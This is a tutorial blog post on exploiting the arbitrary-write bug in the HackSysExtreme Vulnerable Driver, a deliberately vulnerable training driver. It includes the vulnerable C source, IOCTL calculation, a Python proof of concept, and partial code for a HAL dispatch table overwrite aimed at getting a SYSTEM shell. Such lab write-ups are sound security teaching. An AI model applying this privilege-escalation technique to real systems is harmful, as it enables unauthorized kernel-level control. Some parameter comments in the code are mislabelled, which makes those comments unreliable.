---
title:  "Exploit Development: Windows Kernel Exploitation Part 2 - Arbitrary Overwrites (Write-What-Where)"
date:   2019-11-13
tags: [posts]
excerpt: "An introduction to exploiting the ability to write a piece of data to an arbitrary location."
---
Introduction
---
In a previous post, I talked about [setting up a Windows kernel debugging environment](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/). Today, I will be building on that foundation that was built within that post. Again, we will be taking a look at the [HackSysExtreme vulnerable driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/). The HackSysExtreme team implemented a plethora of vulnerablities here, based on the IOCTL code sent to the driver. The vulnerabilitiy we are going to take look at today is what is known as an __arbitrary overwrite__.

At a very high level what this means, is an adversary has the ability to write a piece of data (generally going to be a shellcode) to a particular location. As you may recall from my previous post, the reason why we are able to obtain local administrative privileges (__NT AUTHORITY\SYSTEM__) is because we have the ability to do the following:

1. Allocate a piece of memory in user land that contains our shellcode
2. Execute said shellcode from the context of ring 0 in kernel land

Since the shellcode is being executed in the context of ring 0, which runs as local administrator, the shellcode will be ran with administrative privileges. Since our shellcode will copy the __NT AUTHORITY\SYSTEM__ token to a `cmd.exe` process- our shell will be an administrative shell.

Code Analysis
---
First let's look at the [ArbitraryWrite.h](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/ArbitraryWrite.h) header file.

Take a look at the following snippet:

```c
typedef struct _WRITE_WHAT_WHERE
{
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;
```

[typedef](https://www.tutorialspoint.com/cprogramming/c_typedef.htm) in C, allows us to create our own data type. Just as `char` and `int` are data types, here we have defined our own data type.

Then, the `WRITE_WHAT_WHERE` line, is an alias that can be now used to reference the struct `_WRITE_WHAT_WHERE`. Then lastly, a aliased pointer is created called `PWRITE_WHAT_WHERE`. 

Most importantly, we have a pointer called `What` and a pointer called `Where`. Essentially now, `WRITE_WHAT_WHERE` refers to this struct containing `What` and `Where`. `PWRITE_WHAT_WHERE`, when referenced, is a pointer to this struct.

Moving on down the header file, this is presented to us:

```c
NTSTATUS
TriggerArbitraryWrite(
    _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere
);
```

Now, the variable `UserWriteWhatWhere` has been attributed to the datatype `PWRITE_WHAT_WHERE`. As you can recall from above, `PWRITE_WHAT_WHERE` is a pointer to the struct that contains `What` and `Where` pointers (Which will be exploited later on). From now on `UserWriteWhatWhere` also points to the struct.

Let's move on to the source file, [ArbitraryWrite.c](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/ArbitraryWrite.c).

The above function, `TriggerArbitraryWrite()` is passed to the source file.

Then, the `What` and `Where` pointers decalred earlier in the struct, are initialized as __NULL__ pointers:

```c
PULONG_PTR What = NULL;
PULONG_PTR Where = NULL;
```

Then finally, we reach our vulnerability:

```c
#else
        DbgPrint("[+] Triggering Arbitrary Write\n");

        //
        // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability
        // because the developer is writing the value pointed by 'What' to memory location
        // pointed by 'Where' without properly validating if the values pointed by 'Where'
        // and 'What' resides in User mode
        //

        *(Where) = *(What);
```

As you can see, an adversary could write the value pointed by `What` to the memory location referenced by `Where`. The real issue is that there is no validation using a Windows API function such as [ProbeForRead()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforread) and [ProbeForWrite](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforwrite), that validate whether or not the values of `What` and `Where` reside in user land. Knowing this, we will be able to utilize our user land shellcode going forward for the exploit.

IOCTL
---
As you can recall in the last blog, the IOCTL code that was used to interact with the HEVD vulnerable driver and take advantage of the `TriggerStackOverflow()` funciton, occured at this routine:

<img src="{{ site.url }}{{ site.baseurl }}/images/ARB1.png" alt="">

After tracing the IOCTL routine that jumps into the `TriggerArbitraryOverwrite()` function, here is what is displayed:

<img src="{{ site.url }}{{ site.baseurl }}/images/ARB2.png" alt="">

The above routine is part of a chain as displayed as below:

<img src="{{ site.url }}{{ site.baseurl }}/images/ARB3.png" alt="">

This is probably not the _RIGHT_ way to calculate the needed IOCTL, but this worked for me. Essentially, look at the very first routine from above, that was utilized for my last blog post. The IOCTL code was `0x222003`. (Notice how the value is only 6 digits, even though x86 requires 8 digits in a memory address. `0x222003` = `0x00222003`) The instruction of `sub eax, 0x222003` will yield a value of zero, and the `jz short loc_155FB` (jump if zero) will jump into the `TriggerStackOverflow()` function. So essentially using deductive reasoning, EAX contains a value of `0x222003` at the time the jump is taken.

Looking at the second and third routines in the image above:

```nasm
sub eax, 4
jz short loc_155E3
```
and

```nasm
sub eax, 4
jz short loc_155CB
```
Our goal is to successfully complete the "jump if zero" jump into the applicable vulnerability. In this case, the third routine shown above, will lead us directly into the `TriggerArbitraryOverwrite()`, if the corresponding "jump if zero" jump is completed.

If EAX is currently at `0x222003`, and EAX is subtracted a total of 8 times, let's try adding 8 to the current IOCTL code from the last exploit- `0x222003`. Adding 8 will give us a value of `0x22200B`, or `0x0022200B` as a legitamite x86 value. That means by the time the value of EAX reaches the last routine, it will equal `0x222003` and make the applicable jump into the `TriggerArbitraryOverwrite()` function!

Proof Of Concept
---
Utilizing the newly calculated IOCTL, let's create a POC:

```python
import struct
import sys
import os
from ctypes import *
from subprocess import *

# DLLs for Windows API interaction
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Getting handle to driver to return to DeviceIoControl() function
print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver",
    0xC0000000,                         # lpFileName
    0,                                  # dwDesiredAccess
    None,                               # dwShareMode
    0x3,                                # lpSecurityAttributes
    0,                                  # dwCreationDisposition
    None                                # hTemplateFile
)

poc = "\x41\x41\x41\x41"                # What
poc += "\x42\x42\x42\x42"                # Where
poc_length = len(poc)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    poc,                                # lpInBuffer
    poc_length,                         # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)
```

After [setting up the debugging environment](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/), run the POC. As you can see- `What` and `Where` have been cleanly overwritten!:

<img src="{{ site.url }}{{ site.baseurl }}/images/ARB4.png" alt="">

HALp! How Do I Hax?
---

At the current moment, we have the ability to write a given value at a certain location. How does this help? Let's harp a bit more on the ability to execute user land shellcode from kernel land.

In the stack overflow vulnerability, our user land memory was directly copied to kernel land- without any check. In this case, however, things are not that staight forward. Here, there is no memory copy DIRECTLY to kernel land.

However, there is one way we can execute user land shellcode from kernel land. And that is via The hardware abstraction layer (HAL) table. Let's get into it.

In order to eventually reach HAL, let's talk about why we are doing what we are doing.

The hardware abstraction layer, in Windows, is a part of the kernel that provides routines dealing with hardware/machine instructions. Basically it allows multiple hardware architectures to be compatible with Windows, without the need for a different version of the operating system.

Having said that, there is an undocumented Windows API function known as [NtQueryIntervalProfile()](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/profile/queryinterval.htm)

What does `NtQueryIntervalProfile()` have anything to do with the kernel? How does HAL even help us? Let's talk about this.

If you disassemble the `NtQueryIntervalProfile()` in WinDbg, you will see that a function called `KeQueryIntervalProfile()` is called in this function:

`uf nt!NtQueryIntervalProfile`:

<img src="{{ site.url }}{{ site.baseurl }}/images/ARB5.png" alt="">

If we disassemble the `KeQueryIntervalProfile()`, you can see HAL actually gets called by this function, via a pointer!

`uf nt!KeQueryIntervalProfile`:

<img src="{{ site.url }}{{ site.baseurl }}/images/ARB6.png" alt="">

Essentially, the address at HAL + 0x4, is passed via `KeQueryIntervalProfile()`. If we can overwrite that pointer with a pointer to our user land shellcode, natural execution will eventually execute our shellcode, when `NtQueryIntervalProfile()` (which calls `KeQueryIntervalProfile()`) is called!

Order Of Operations
---
Here are the steps we need to take, in order for this to work:

1. Enumerate all drivers addresses via [EnumDeviceDrivers()](https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers?redirectedfrom=MSDN)
2. Sort through the list of addresses for the address of `ntkrnl.exe` (`ntkrnl.exe` exports `KeQueryIntervalProfile()`)
3. Load `ntkrnl.exe` handle into [LoadLibraryExA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa) and then enumerate HAL address via [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
4. Once HAL address is found, we will calculate the address of HAL + 0x4 (by adding 4 bytes), and overwrite that pointer with a pointer to our user land shellcode

EnumDeviceDrivers()
---
```python
# Enumerating addresses for all drivers via EnumDeviceDrivers()
base = (c_ulong * 1024)()
get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    c_int(1024),                      # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)
```

This snippet of code enumerates the base addresses for the drivers, and exports them to an array. After the base addresses have been enumerated, we can move on to finding the address of `ntkrnl.exe`

ntkrnl.exe
---
```python
# Cycle through enumerated addresses, for ntkrnl.exe using GetDeviceDriverBaseNameA()
for base_address in base:
    if not base_address:
        continue
    current_name = c_char_p('\x00' * 1024)
    driver_name = psapi.GetDeviceDriverBaseNameA(
        base_address,                 # ImageBase (load address of current device driver)
        current_name,                 # lpFilename
        48                            # nSize (size of the buffer, in chars)
    )

    # Error handling if function fails
    if not driver_name:
        print "[+] GetDeviceDriverBaseNameA() function call failed!"
        sys.exit(-1)

    if current_name.value.lower() == 'ntkrnl' or 'ntkrnl' in current_name.value.lower():

        # When ntkrnl.exe is found, return the value at the time of being found
        current_name = current_name.value

        # Print update to show address of ntkrnl.exe
        print "[+] Found address of ntkrnl.exe at: {0}".format(hex(base_address))

        # It assumed the information needed from the for loop has been found if the program has reached execution at this point.
        # Stopping the for loop to move on.
        break
 ```
 
 This is a snippet of code that essentially will loop through the array where all of the base addresses have been exported to, and search for `ntkrnl.exe`. Once that has been found, the address will be enumerated.
 
 LoadLibraryExA()
 ---
 ```python
 # Now that all of the proper information to reference HAL has been enumerated, it is time to get the location of HAL and HAL 0x4
# NtQueryIntervalProfile is an undocumented Windows API function that references HAL at the location of HAL +0x4.
# HAL +0x4 is the address we will eventually need to write over. Once HAL is exported, we will be most interested in HAL + 0x4

# Beginning enumeration
kernel_handle = kernel32.LoadLibraryExA(
    current_name,                       # lpLibFileName (specifies the name of the module, in this case ntlkrnl.exe)
    None,                               # hFile (parameter must be null
    0x00000001                          # dwFlags (DONT_RESOLVE_DLL_REFERENCES)
)

# Error handling if function fails
if not kernel_handle:
    print "[+] LoadLibraryExA() function failed!"
    sys.exit(-1)
```
